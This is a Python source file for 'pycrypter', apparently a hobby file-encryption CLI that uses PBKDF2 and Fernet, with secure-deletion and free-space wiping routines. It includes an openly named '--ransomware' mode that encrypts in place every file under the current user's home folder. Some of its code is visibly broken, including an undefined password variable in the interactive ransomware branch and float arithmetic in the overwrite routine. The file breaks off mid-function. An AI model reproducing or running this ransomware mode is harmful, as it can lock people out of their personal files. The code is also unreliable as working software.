# pycrypter version
PYCRYPTER_VERSION = "1.4" # this is a const, do not modify it below this line

# Required Modules
import platform
import atexit
import traceback

import os
import sys
import argparse

import getpass
import signal
import ctypes

import logging
import secrets
from dotenv import load_dotenv

# Threading Modules
import threading
import queue

# Other Modules
import time
import psutil
import shutil

# Customization Modules
import colorama
from colorama import Fore, Back, Style
from tqdm import tqdm

colorama.init()

# Tkinter GUI Module
import tkinter as tk

if platform.system() == "Windows":
	# pywin32 Modules
	import win32api
	import win32con
	import win32file
	
	from winnt import MAXDWORD
	import pywintypes

# Cryptography Modules
import base64
import hashlib
import cryptography

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet

# terminal progress bar
def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='='):
	"""
	Call sys.stdout.write() to write a progress bar to the terminal

	Parameters:
		iteration (int): current iteration (required)
			The current iteration of the loop.
		
		total (int): total iterations (required)
			The total number of iterations for the loop
		
		prefix (str): prefix string (optional, defaults to "")
			A string that appears before the progress bar.
		
		suffix (str): suffix string (optional, defaults to "")
			A string that appears after the progress bar.
		
		decimals (int): positive number of decimals in percent complete (optional, defaults to 1)
			The number of decimal places to show in the percentage.
		
		length (int): character length of bar (optional, defaults to 50)
			The length of the progress bar.
		
		fill (str): bar fill character (optional, defaults to "=")
			The character used to fill the progress bar.

	Returns:
		None
		
	Example usage:
		progress_bar(10, 100, prefix='Progress:', suffix='Complete', decimals=1, length=50, fill='=')
		
		Output:
			Progress: |=====---------------------------------------------| 10.0% Complete
	"""
	
	if not isinstance(iteration, int):
		raise TypeError(f"total expected an integer, got {type(iteration).__name__}")
	
	if not isinstance(total, int):
		raise TypeError(f"total expected an integer, got {type(total).__name__}")
	
	percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
	filled_length = int(length * iteration // total)
	bar = fill * filled_length + '-' * (length - filled_length)

	sys.stdout.write('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
	sys.stdout.flush()

# |==================================================| Threading functions |==================================================|

class ThreadManager:
	def __init__(self):
		self.error_list = []
		
		self.threads_set = set()
		self.semaphore = threading.Semaphore(5)
	
	def set_thread_count(self, num):
		if not isinstance(num, int):
			raise TypeError(f"num expected int, got {type(num).__name__}")
		
		if num < 1:
			num = 1
		self.semaphore = threading.Semaphore(num)
	
	# thread worker
	def worker(
			self, callback_function,
			semaphore=None, threads_set=None,
			error_list=None,
			*args, **kwargs
		):
		
		# Guard clauses
		if threads_set == None:
			threads_set = self.threads_set
		elif not isinstance(threads_set, set):
			raise TypeError(f"threads_set expected set, got {type(error_list)}")
		
		if error_list == None:
			error_list = self.error_list
		elif not isinstance(error_list, list):
			raise TypeError(f"error_list expected list, got {type(error_list)}")
		
		# Semaphore guard clause
		if not hasattr(semaphore, 'acquire'):
			if semaphore == None:
				semaphore = self.semaphore
			else:
				raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")
		
		if not isinstance(threads_set, (list, set, tuple)):
			raise TypeError(f"threads expected a list/set/tuple, got {type(threads_set)}")
		
		try:
			current_thread = threading.current_thread()

			func_name = callback_function.__name__
			
			with semaphore:  # acquire and release the semaphore
				try:
					callback_function(*args, **kwargs)
				except Exception as err:
					if error_list is not None:
						# tb means traceback
						tb_dict = {}
						tb_msg = traceback.format_exc()
						
						tb_dict["name"] = type(err).__name__
						tb_dict["caller"] = func_name
						
						tb_dict["traceback"] = tb_msg
						
						error_list.append(tb_dict)
					else:
						tb_msg = traceback.format_exc()
						print(tb_msg)
				finally:
					threads_set.remove(current_thread) if current_thread in threads_set else None
		except Exception as err:
			print(f"\nexception caught at worker: \n")
			traceback.print_exc()

	# create a thread
	def thread_create(
			self, callback,
			semaphore=None, threads_set=None,
			thread_name="", error_list=None,
			*args, **kwargs
		):
		
		# Guard clauses
		if threads_set == None:
			threads_set = self.threads_set
		elif not isinstance(threads_set, set):
			raise TypeError(f"threads_set expected set, got {type(error_list)}")
		
		if error_list == None:
			error_list = self.error_list
		elif not isinstance(error_list, list):
			raise TypeError(f"error_list expected list, got {type(error_list)}")
		
		if not hasattr(semaphore, 'acquire'):
			if semaphore == None:
				semaphore = self.semaphore
			else:
				raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")
		
		if not isinstance(threads_set, (list, set, tuple)):
			raise TypeError(f"threads_set expected a list/set/tuple, got {type(threads_set)}")
		
		thread = threading.Thread(
			target = self.worker,
			args = (callback, semaphore, threads_set, error_list, *args),
			kwargs = kwargs,
			name = thread_name
		)
		
		threads_set.add(thread)
		thread.start()

		return thread

# |==================================================| Iteration functions |==================================================|

# iterate through a directory and optionally a subdirectory
def iterate_dir(directory, iterate_tree=True, skip_dirs=None):
	"""
	Iterate through a directory while optionally iterating through the sub-directories
	
	Parameters:
		directory (str): directory to iterate (required)
			The directory passed to iterate through.
			
		iterate_tree (bool): iterate through sub-directories (optional, defaults to True)
			Defines whether the script iterates through sub-directories or not.
			
		skip_dirs (list): list of directories to skip (optional, defaults to []/empty list)
			Defines the sub-directories to exclude from the search.
			
		Returns:
			set: file_paths
			- Returns absolute paths
				
		Example usage:
			Passing a non-boolean [True, False] to
			the iterate_tree argument will result in a ValueError:
			
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise ValueError("iterate_tree must be a valid boolean")
			ValueError: iterate_tree must be a valid boolean
			
			[Passing True, False, 1, 0 is a valid boolean]
			
			=========================================================
			Passing a non-existent directory/a file will not raise
			an exception, but instead return a string value, signaling
			an error:
			
			Example 1:
				files = iterate_dir("C:\\MyFakeDirectory", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			Example 2:
				files = iterate_dir("C:\\MyPython\\myfile.txt", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			=========================================================
			A PermissionError exception will be caught, and added to
			an exception list:
						
			import win32api
			import win32con

			# Set the system attribute for the MyPython folder
			win32api.SetFileAttributes("C:\\MyPython\\", win32con.FILE_ATTRIBUTE_SYSTEM)

			permission_errors = []
			
			# Assume this code has two files, the script and "sys.txt"
			files = iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			print(files)
			print(permission_errors)
			
			[Output]
			[]
			['iterate_dir | A PermissonError occured! Path: "C:\\MyPython"']
			
			---------------------------------------------------------
			How to call:
			
			files = iterate_dir(".", iterate_tree=True, skip_dirs=[])
			
			print(files)
			
			---------------------------------------------------------
			We can assume that the files in the current working directory
			is the current script file and a.txt, so this will be the output:
			
			['.\\pycrypter.py', '.\\a.txt']
			---------------------------------------------------------
			
			If you use "."/".." as the directory argument, any added to
			the list will be formatted as so:
			
			['.\\example.txt', '..\\myfile.txt']
			
			However, using the absolute path like so:
			iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			Will return the absolute path, formatted like this:
			
			['C:\\MyPython\\a.txt']
	"""
	
	if not skip_dirs:
		skip_dirs = set()
	
	if iterate_tree not in [True, False]:
		raise TypeError(f"iterate_tree expected boolean, got {iterate_tree}")

	file_paths = set()
	
	# Check argument if it's a directory
	if not os.path.isdir(directory):
		if os.path.isfile(directory):
			raise NotADirectoryError(f'[Errno 21] Not a directory: {directory}')
		else:
			raise FileNotFoundError(f'[Errno 2] No such directory: {directory}')
	
	# Iterate through the directory, and catch PermissionErrors
	try:
		directory = os.path.abspath(directory)
		
		for filename in os.listdir(directory):
			path = os.path.join(directory, filename)
			
			if path in skip_dirs:
				continue
			
			if os.path.isfile(path):
				file_paths.add(path)

			elif os.path.isdir(path) and iterate_tree:
				file_paths.update(iterate_dir(path))
	except PermissionError as err:
		raise err
	finally:
		return file_paths

# |==================================================| Cipher functions |==================================================|

class CipherManager:
	def __init__(self):
		self.hash_method = hashes.SHA256()
		
	def hash_string(self, input_string, hash_method=None):
		"""
			Hash a string with the provided hash method.
				
			Parameters:
				self [class parameter]
				input_string: [required, can be str or bytes]
				
				hash_method: [hashes.SHA256()]
				
			How to use:
				[hashes is cryptography.hazmat.primitves.hashes]
				
				Call hash_string like so:
				[example output]
				
				>>> hash_string("example")
				50d858e0985ecc7f60418aaf0cc5ab587f42c2570a884095a9e8ccacd0f6545c
				
				Optionally, your can provide a hash object:
				[example output]
				
				>>> hash_string("example", hash_method=hashes.SHA512())
				3bb12eda3c298db5de25597f54d924f2e17e78a26ad8953ed8218ee682f0bbbe9021e2f3 \
				009d152c911bf1f25ec683a902714166767afbd8e5bd0fb0124ecb8a
		"""
		
		if hash_method is None:
			hash_method = self.hash_method
		
		if not isinstance(input_string, bytes):
			bytes_passed = input_string.encode('utf-8')
		else:
			bytes_passed = input_string
		
		digest = hashes.Hash(hash_method)

		digest.update(bytes_passed)
		hashed_bytes = digest.finalize()

		hashed_string = hashed_bytes.hex()
		return hashed_string
	
	def hash_key(
			self, input_key,
			salt=b"", hash_pepper=b"",
			
			password_pepper=b"", hash_method=None
		):
		"""
			Create a kdf-derived key using PBKDF2HMAC.
			
			Quick help:
				[hashes is cryptography.hazmat.primitves.hashes]
				
				A salt is a random value that makes the output more random,
				
				A pepper is a random secret value that only the program should know
				and must not be stored with the password.
				
				- hash_pepper is used during creating the PBKDF2HMAC object
				- password_pepper is used during key derivation
				
				You can pass a hash object to make the hash longer.
				- defaults to hashes.SHA256()
				
			Parameters:
				self: [class parameter]
				
				input_key: [required, can be str or bytes]
				salt: [defaults to b""]
				
				hash_pepper: [defaults to b""]
				password_pepper: [defaults to b""]
				
				hash_method: [defaults to hashes.SHA256()]
				
			How to use:
				[Warning: Please do not use the byte strings below.]
				
				Call hash_key like so:
					>>> hash_key("example")
					b'\xd4\x1f\t\x1e\xcd\xfb\xb9{\xc6\x08Mn\xfe\x05\xe0\xdd\x9f \
					\x11\xf8\xc3"\x17]\xee\x13\xff:\xa0n\x04\xb0j'
				
				-- The output above is an example of a key derived from PBKDF2HMAC.
				-- Of course, it's best to add a salt for more uniqueness.
				
				Add a salt like so:
					>>> salt = secrets.token_bytes(32)
					>>> salt
					b'=D\xf8A\xfb\xef\xe6\xb1V&]\x8a\x88\xbf\xf3\xc9\xd2\xb2 \
					\x16Zw~g\x83t\xbax\xb5\xa9\xbb\x9dB'
					
					>>> hash_key("example", salt=salt)
					b's@\xbe\xb7r\xe9\x1c\x0e\xd1\xbf\xb5\xecp\xb1\x03\x85 \
					\xc7D0\xb3\x18\xd4[\xaa\xcd\xfb\x92\xcf\xf1\x8a\x81V'
				
				-- By adding a salt, you add more randomness, and prevent
				-- rainbow table attacks.
				
				Add peppers like so:
					>>> salt = secrets.token_bytes(32)
					>>> salt
					b'n_eK*?v\x1c\xe8e\xfa0\xf1/|\xf2\x0c\x06\xd2 \
					\xf6\x18\xbf\x9a%"\x9a\x98\xcb\x8e3r\t'
					
					>>> hash_pepper = secrets.token_bytes(32)
					>>> hash_pepper
					b'\x0e\xae\xcdO@a\x98|\xe1\xd2=\xa0\xc9\xd24\x88 \ 
					\xc3\x03\x97vK\xc6C\xf1\xee\xa5Cs\xef}\x14W'
					
					>>> password_pepper = secrets.token_bytes(32)
					>>> password_pepper
					b'!\x05R`\x1b\xf6\xd8gIO\x8d\xd0\xda9/\x90U \
					\x11\r\xcf\x982S\xe4\xae\x82m8_,\xcc\xed'
					
					>>> hash_key("example", salt=salt, hash_pepper=hash_pepper, password_pepper=password_pepper)
					b"\x1d\t\xda>Ah\xb7'`hk\x12\xed\x0f\x0e6\xc8\x07\xe6\xd47\xef \xbf\x7f\xe5\xfb\x92\xbdBA["
					
				-- A breakdown of what the code is doing:
					Firstly, it generates 3 secret values, a salt, a hash pepper and a password pepper.
					Next, it passes the string "example" and the 3 values to hash_key.
					
					hash_key parses the arguments, and creates the PBKDF2HMAC object with:
					- salt
					- hash_pepper
					- hash algorithm [default one]
					
					Then, it derives the key using the KDF object, while also
					adding the password pepper, to ensure that even if the password
					is correct, it will still fail to match due to the pepper.
		"""
		
		if hash_method is None:
			hash_method = self.hash_method
		
		kdf = PBKDF2HMAC(
			algorithm=hash_method,
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
			
		key = None
			
		if isinstance(input_key, bytes):
			key = kdf.derive(input_key + password_pepper)
		else:
			key = kdf.derive(input_key.encode() + password_pepper)
		
		return key
	
	def compare_hash(self, hash_1, hash_2):
		"""
			Compare a hash using secrets.compare_digest.
			
			Quick help:
				Comparing hashes using "==" is a bad idea,
				Using a digest comparison function is better.
				
				This simply compares the hash digest
				[The hex, which looks like 223d3c2cdafefk . . .]
			
			Parameters:
				self [class parameter]
				
				hash_1 [first hash]
				hash_2 [second hash]
				
			How to use:
				Pass two hashes as parameters.
					>>> hash_1 = "d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa"
					>>> hash_2 = "d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa"
					-- Both hashes are the same, also the input string was "hash"
					
					>>> compare_hash(hash_1, hash_2)
					True
				
				This is useful for checking if the hash matches an input:
					>>> expected_hash = "d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa"
					>>> input_hash = hash_string(input("Enter the string: "))
					falsehash
					
					-- The value of falsehash is: "45b7033e65585da8eda3fe91064a091b7321643078c569ef3d694a0c29f864fb"
					>>> compare_hash(expected_hash, input_hash)
					False
		"""
		compare_output = secrets.compare_digest(hash_1, hash_2)
		return compare_output
	
	def generate_peppers(self, env_path="pepper.env", skip_prompt=False):
		"""
			Generate peppers to use for PBKDF2HMAC.
			
			Quick help:
				This function is a simple and easy way to generate peppers,
				but make sure to keep the peppers hidden and safe.
				
				You can optionally provide a name, or let it default to pepper.env
			
			Parameters:
				self [class parameter]
				env_path [defaults to pepper.env]
				
				skip_prompt [defaults to False]
			
			How to use:
				Call the function.
					>>> generate_peppers()
					Wrote peppers to pepper.env, please make sure to keep the peppers in a safe area.
					
				-- You can check pepper.env, then use load_dotenv("pepper.env") and os.getenv()
				
				Call the function with an optional name:
					>>> generate_peppers("some_peppers.env")
					Wrote peppers to pepper.env, please make sure to keep the peppers in a safe area.
				
				-- Same thing above, but now it's named "some_peppers.env"
				
				If the pepper already exists:
					>>> generate_peppers()
					Warning: pepper.env already exists, overwrite? [Y/N]: 
					-- You can choose to overwrite it, or return.
					
				Optionally, skip the prompt:
					>>> generate_peppers(skip_prompt=True)
					Wrote peppers to pepper.env, please make sure to keep the peppers in a safe area.
		"""
		
		if os.path.isdir(env_path):
			raise IsADirectoryError(f"[Errno 21] Is a directory: {env_path}")
		
		if os.path.isfile(env_path) and not skip_prompt:
			confirm = input(f"Warning: {env_path} already exists, overwrite? [Y/N]: ")
			
			if confirm.lower() == "y":
				pass
			else:
				return
			
		with open(env_path, "w") as file:
			hash_pepper = secrets.token_bytes(32)
			password_pepper = secrets.token_bytes(32)
			
			file.write(f"hash_pepper={str(hash_pepper)}\n")
			file.write(f"password_pepper={str(password_pepper)}")
			
			print(f"Wrote peppers to {env_path}, please make sure to keep the peppers in a safe area.")

	# encryption function
	def encrypt_file(
			self, input_file,
			kdf_key=b"", password="",
			
			keep_copy=False, hash_pepper=b"",
			password_pepper=b""
		):
		def cipher_init(input_file, salt=b"", key=b"", keep_copy=False, is_precomputed=False):
			if len(key) < 32:
				raise ValueError("Key length is invalid for fernet.")
			
			with open(input_file, "rb+") as file:
				if is_precomputed:
					salt=b""
				
				fernet_key = base64.urlsafe_b64encode(key)
				
				file.seek(0, os.SEEK_SET)
				chunk = file.read(50 * 1024 * 1024)
				
				file.seek(0, os.SEEK_SET)
				file.write(salt)
				
				if keep_copy:
					file_name, file_ext = os.path.splitext(input_file)
					shutil.copy2(input_file, f"{file_name}_decrypted-copy{file_ext}")

				while chunk:
					chunk_encrypted = Fernet(fernet_key).encrypt(chunk)
					file.write(chunk_encrypted)
					
					chunk = file.read(50 * 1024 * 1024)  # Read 50MB at a time
				
				return 0
			
		# Guard clauses
		if input_file == sys.argv[0]:
			raise ValueError(f"cannot cipher source file [{sys.argv[0]}]")

		if keep_copy not in [True, False]:
			raise TypeError(f'keep_copy expected boolean, got {keep_copy}')

		# Check argument if it's a file
		if not os.path.isfile(input_file):
			if os.path.isdir(input_file):
				raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
			else:
				raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")
		
		# Encrypt the file in chunks
		file_size = os.path.getsize(input_file)
			
		if file_size > (2 * 1024 * 1024 * 1024):
			print(f"{Fore.YELLOW}Warning: encrypt_file has detected that '{input_file}' is larger than 2GB, do not kill the python process.")
		
		# If a precomputed key is passed, use it
		if kdf_key:
			if len(kdf_key) < 32:
				raise ValueError("Key length is invalid for fernet.")
				
			cipher_init(input_file, key=kdf_key, keep_copy=keep_copy, is_precomputed=True)
			return 0
			
		# Encode the hash and password pepper if not a byte string
		if not isinstance(hash_pepper, bytes):
			hash_pepper = hash_pepper.encode()
			
		if not isinstance(password_pepper, bytes):
			password_pepper = password_pepper.encode()
			
		salt = secrets.token_bytes(32)
		
		# Construct the PBKDF2HMAC object
		kdf = PBKDF2HMAC(
			algorithm=self.hash_method,
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
			
		key = None
			
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		cipher_init(input_file, key=key, keep_copy=keep_copy, salt=salt)
		return 0

	# decryption function
	def decrypt_file(
			self, input_file,
			kdf_key=b"", password="",
			
			keep_copy=False, hash_pepper=b"",
			password_pepper=b""
		):
		def decipher_init(input_file, key=b"", keep_copy=False, is_precomputed=False):
			if len(key) < 32:
				raise ValueError("Key length is invalid for fernet.")
			
			with open(input_file, "rb+") as file:
				fernet_key = base64.urlsafe_b64encode(key)
				
				# If a precomputed key was used, no salt should be available
				if not is_precomputed:
					file.seek(32, os.SEEK_SET)
				
				chunk = file.read(50 * 1024 * 1024)
				decrypt_successful = False
				
				try:
					chunk_encrypted = Fernet(fernet_key).decrypt(chunk)
					decrypt_successful = True
				except cryptography.fernet.InvalidToken as error:
					raise error
				finally:
					file.close() if not decrypt_successful else None
				
				# Erase/keep the file
				if keep_copy:
					file_name, file_ext = os.path.splitext(input_file)
					shutil.copy2(input_file, f"{file_name}_encrypted-copy{file_ext}")
				
				cursor_position = None
				plaintext_end = 0
				
				while chunk:
					chunk_decrypted = Fernet(fernet_key).decrypt(chunk)
					plaintext_end += len(chunk_decrypted)
					
					cursor_position = file.tell()
					
					file.seek(0, os.SEEK_SET)
					file.write(chunk_decrypted)
					
					file.seek(cursor_position, os.SEEK_SET)
					chunk = file.read(50 * 1024 * 1024)
				
				file.truncate(plaintext_end)
				return 0

		# Guard clauses
		if input_file == sys.argv[0]:
			raise ValueError(f"cannot cipher source file [{sys.argv[0]}]")

		if keep_copy not in [True, False]:
			raise TypeError(f'expected boolean, got {keep_copy}')

		# Check argument if it's a file
		if not os.path.isfile(input_file):
			if os.path.isdir(input_file):
				raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
			else:
				raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")

		# Decrypt the file in chunks
		file_size = os.path.getsize(input_file)
			
		if file_size > (2 * 1024 * 1024 * 1024):
				print(f"{Fore.YELLOW}Warning: decrypt_file has detected that {input_file} is larger than 2GB, do not kill the python process.")
			
		if kdf_key:
			if len(kdf_key) < 32:
				raise ValueError("Key length is invalid for fernet.")
				
			decipher_init(input_file, key=kdf_key, keep_copy=keep_copy, is_precomputed=True)
			return 0
			
		# Encode the hash and password pepper if not a byte string
		if not isinstance(hash_pepper, bytes):
			hash_pepper = hash_pepper.encode()
			
		if not isinstance(password_pepper, bytes):
			password_pepper = password_pepper.encode()
		
		salt = None
		
		with open(input_file, "rb+") as file:
			salt = file.read(32)
		
		kdf = PBKDF2HMAC(
			algorithm=self.hash_method,
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
		
		key = None
		
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		decipher_init(input_file, key=key, keep_copy=keep_copy, is_precomputed=False)
		return 0
	
	# encryption function
	def encrypt_data(self, data, kdf_key=b"", password="", hash_pepper=b"", password_pepper=b""):
		def cipher_init(data, salt=b"", key=b"", is_precomputed=False):
			if len(key) < 32:
				raise ValueError("Key length is invalid for fernet.")
			
			encrypted_data = b""
			
			if is_precomputed:
				salt = b""
			
			try:
				if not isinstance(data, bytes):
					data = data.encode()
				
				if len(key) < 32:
					raise ValueError("Key length is invalid for fernet.")
				
				fernet_key = base64.urlsafe_b64encode(key)
				encrypted_data = salt + Fernet(fernet_key).encrypt(data)
			except Exception as error:
				raise error
			finally:
				for _ in range(35):
					data = secrets.token_hex(32)
					fernet_key = secrets.token_hex(32)
					
					key = secrets.token_hex(32)
				
			return encrypted_data
			
		if kdf_key:
			if len(kdf_key) < 32:
				raise ValueError("Key length is invalid for fernet.")
			
			return cipher_init(data=data, key=kdf_key, is_precomputed=True)
		
		salt = secrets.token_bytes(32)

		kdf = PBKDF2HMAC(
			algorithm=self.hash_method,
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
			
		key = None
			
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		return cipher_init(data=data, key=key, salt=salt, is_precomputed=False)

	# decryption function
	def decrypt_data(self, data, kdf_key=b"", password="", hash_pepper=b"", password_pepper=b""):
		def decipher_init(data, key=b"", is_precomputed=False):
			if len(key) < 32:
				raise ValueError("Key length is invalid for fernet.")
			
			decrypted_data = b""
			
			if not is_precomputed:
				data = data[32:]
			
			try:
				fernet_key = base64.urlsafe_b64encode(key)
				decrypted_data = Fernet(fernet_key).decrypt(data)
			except cryptography.fernet.InvalidToken as error:
				raise error
			finally:
				key = secrets.token_hex(32)
				
				for _ in range(35):
					data = secrets.token_hex(32)
					fernet_key = secrets.token_hex(32)
			
			return decrypted_data
			
		if kdf_key:
			if len(kdf_key) < 32:
				raise ValueError("Key length is invalid for fernet.")
			
			return decipher_init(data=data, key=kdf_key, is_precomputed=True)
		
		salt = data[:32]
				
		kdf = PBKDF2HMAC(
			algorithm=self.hash_method,
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
		
		key = None
		
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		return decipher_init(data=data, key=key, is_precomputed=False)

# Overwrite deletion
class DataOverwriter:
	def __init__(self):
		self.cleanup = False
	
	def stop(self):
		self.cleanup = True
	
	def file_overwrite(
			self, file_path,
			file_size=0, chunk_size=100 * 1024 * 1024
		):
		try:
			if not isinstance(chunk_size, (int, float)):
				raise TypeError(f"chunk_size expected int/float, got {type(chunk_size).__name__}")
			
			file_path = os.path.abspath(file_path)
			
			if not isinstance(file_size, int) or file_size < 1:
				file_size = os.path.getsize(file_path)
			
			switch = {
				0: bytearray([0x00, 0xAA]),
				1: bytearray([0xFF, 0x55]),
				
				2: os.urandom(2)
			}
			
			with open(file_path, 'wb') as file:
				original_size = file_size
				
				# Overwrite with a random bytearray
				chunk = chunk_size
				file.truncate(0)		
				
				for i, pass_iteration in enumerate(range(3)):
					chunk_data = switch[i]
					file_size = original_size
					
					while file_size > 0:
						if self.cleanup:
							file.truncate(0)
							file.close()
							
							os.remove(file_path)
							return
						
						chunk = min(file_size, chunk_size)
						
						file.write(chunk_data * chunk / 2)
						file_size -= chunk
					
					os.fsync(file.fileno())
					file.truncate(0)
		except PermissionError as error:
			raise error
		finally:
			os.remove(file_path)

	def freespace_overwrite(self, disk_drive, file_name="", chunk_size=500 * 1024 * 1024):
		for char in disk_drive:
			pattern = "\\/"
			
			if char in pattern:
				disk_drive = disk_drive.replace(char, "")
			
		if not file_name:
			file_name = disk_drive + "\\disk_filler_file.tmp"
		else:
			file_name = disk_drive + "\\" + file_name
		
		try:
			if not isinstance(chunk_size, (int, float)):
				raise TypeError(f"chunk_size expected int/float, got {type(chunk_size).__name__}")
			
			memory = psutil.virtual_memory()
			memory_available = memory.available
			
			if chunk_size > memory_available:
				raise MemoryError("cannot allocate enough memory for chunk_size [not enough available memory]")
			
			with open(file_name, 'wb') as file:
				usage = psutil.disk_usage(disk_drive)
				usage_free = usage.free
				
				# Allow 1 GB to be allocated to prevent out of storage issues
				original_free_space = int(format(usage_free // (1024 * 1024 * 1024))) - 1
				chunk = chunk_size
				
				switch = {
					0: bytearray([0x00, 0xAA]),
					1: bytearray([0xFF, 0x55]),
						
					2: os.urandom(2)
				}
				
				for i, pass_iteration in enumerate(range(3)):
					free_space = original_free_space
					chunk_data = switch[i]
						
					while free_space > 0:
						if self.cleanup:
							file.truncate(0)
							file.close()
							
							os.remove(file_name)
							return
						
						file.write(chunk_data * int(chunk / 2))
						free_space -= chunk
					
					os.fsync(file.fileno())
					file.truncate(0)
		except PermissionError as error:
			raise error
		finally:
			os.remove(file_name) if os.path.isfile(file_name) else None 

class Main:
	def __init__(self):
		if __name__ != "__main__":
			raise RuntimeError("class Main must be called as __main__")

		# pepper | DO NOT LEAK THIS!
		load_dotenv("pepper.env")
		
		self.hash_pepper = os.getenv("hash_pepper")
		self.password_pepper = os.getenv("password_pepper")
		
		# cleanup variables
		self.cleanup = False
		self.interactive = {'init': False}

		# misc
		self.thread_mgr = ThreadManager()
		self.thread_create = self.thread_mgr.thread_create
		
		self.cipher_mgr = CipherManager()
		
		self.encrypt_file = self.cipher_mgr.encrypt_file
		self.decrypt_file = self.cipher_mgr.decrypt_file
		
		# self.parser objects
		self.args = None
		
		self.parser = argparse.ArgumentParser(description=f'Pycrypter CLI by NewGuy103. v{PYCRYPTER_VERSION}')

		self.parser.add_argument(
			'-i', '--interactive',
			action="store_true",
			help="pycrypter's interactive CLI mode"
		)
		
		self.parser.add_argument(
			'-rw', '--ransomware',
			action="store_true",
			help="Ransomware mode, this will fetch the user's folder and cipher files inside it [Excluding AppData]."
		)

		self.parser.add_argument(
			'-e', '--encrypt',
			action="store_true",
			help='Encryption switch.'
		)

		self.parser.add_argument(
			'-d', '--decrypt',
			action="store_true",
			help='Decryption switch.'
		)

		self.parser.add_argument(
			'-ds', "--deep-search",
			action="store_true",
			help='If specified, search the sub-folders of the directory specified.'
		)	

		self.parser.add_argument(
			'-c', "--keep-copy",
			action="store_true",
			help='If specified, keep a copy of the encrypted/decrypted file.'
		)

		self.parser.add_argument(
			'-v', "--verbose",
			action="store_true",
			help='Show detailed output to the command-line.'
		)

		self.parser.add_argument(
			'-t', '--threads',
			metavar='int',
			nargs="?",
			type=int,
			help="Sets the maximum amount of files to process in memory."
		)

		self.parser.add_argument(
			'-f', "--file",
			metavar='input_file',
			type=str,
			nargs="+",
			help='File path(s) to specify.'
		)

		self.parser.add_argument(
			'-dr', "--directory",
			metavar='input_dir',
			type=str,
			nargs="+",
			help='Directory path(s) to specify.'
		)
	
	def pycrypter_interactive(self):
		"""
		
		"""
		
		self.interactive['init'] = True
		
		def tokenize(string):
			tokens = []
			start = 0
			in_quotes = False

			for iteration, char in enumerate(string):
				if char == '"' or char == "'":
					in_quotes = not in_quotes
				elif char == ' ' and not in_quotes:
					token = string[start:iteration]
					
					if in_quotes and token.startswith('"') and token.endswith('"'):
						token = token[1:-1]  # remove quotes
					tokens.append(token)
					start = iteration + 1

			token = string[start:]
			if in_quotes and token.startswith('"') and token.endswith('"'):
				token = token[1:-1]  # remove quotes
			tokens.append(token)

			for iteration, token in enumerate(tokens):
				if (token[0] == '"' and token[len(token) - 1] == '"'):
					tokens[iteration] = tokens[iteration][1:-1]
				
				if token[0] == "'" and token[len(token) - 1] == "'":
					tokens[iteration] = tokens[iteration][1:-1]
			
			return tokens
		
		while True:
			if self.cleanup:
				break
			
			time.sleep(0.01)
			try:
				command = input("pycrypter> ")
			except EOFError:
				break
			
			if command == "exit":
				break
			
			if "encrypt " in command.lower():
				encryption_arguments = command.replace("encrypt ", "").lower()
				keep_copy = False
				
				if "-c " in encryption_arguments or "--keep-copy " in encryption_arguments:
					keep_copy = True
					
					args1 = encryption_arguments.replace("-c ", '')
					encryption_arguments = args1.replace("--keep_copy ", '')
					
				if "-rw" in encryption_arguments or "--ransomware" in encryption_arguments:
					args1 = encryption_arguments.replace("-rw", "")
					encryption_arguments = args1.replace("--ransomware", "")
					
					cipher_method = "encrypt"
					current_user = os.getlogin()
					
					self.cipher_directory(
						f"C:\\Users\\{current_user}",
						verbose = self.args.verbose,
						password = password,
						keep_copy = self.args.keep_copy,
						cipher_method = cipher_method
					)
					continue
					
				if "-f " in encryption_arguments or "--file " in encryption_arguments:
					args1 = encryption_arguments.replace("-f ", "")
					argument_files = args1.replace("--file ", "")
					
					files = tokenize(argument_files)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if files:
						self.cipher_file(
							files,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="encrypt"
						)
					
				if "-dr " in encryption_arguments or "--directory " in encryption_arguments:
					args1 = encryption_arguments.replace("-dr ", "")
					argument_directories = args1.replace("--directory ", "")
					
					directories = tokenize(argument_directories)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if directories:
						self.cipher_directory(
							directories,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="encrypt"
						)
				
			
			if "decrypt " in command.lower():
				decryption_arguments = command.replace("decrypt ", "").lower()
				keep_copy = False
				
